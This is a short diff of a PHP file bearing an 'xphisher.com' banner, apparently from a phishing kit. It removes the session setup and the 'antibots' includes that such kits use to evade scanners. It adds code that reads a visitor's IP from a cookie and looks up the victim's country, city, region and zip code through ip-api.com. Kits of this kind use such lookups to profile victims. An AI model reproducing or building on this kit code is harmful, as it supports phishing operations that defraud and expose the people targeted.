@@ -9,11 +9,13 @@ ____  ___        __________.__    .__       .__
       \_/                       \/        \/     \/     \/       
 ========================= xphisher.com ===========================
 */
-session_start();
-error_reporting(0);
-include "./antibots1.php";
-include "./antibots2.php";
-include "./antibots3.php";
-include "./antibots4.php";
-
+$ip = $_COOKIE['ip11'];
+$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
+$LOOKUP_COUNTRY = $IP_LOOKUP->country;
+$LOOKUP_CNTRCODE= $IP_LOOKUP->countryCode;
+$LOOKUP_CITY    = $IP_LOOKUP->city;
+$LOOKUP_REGION  = $IP_LOOKUP->region;
+$LOOKUP_STATE   = $IP_LOOKUP->regionName;
+$LOOKUP_ZIPCODE = $IP_LOOKUP->zip;
+$Ip             = $IP_LOOKUP->query;
 ?>
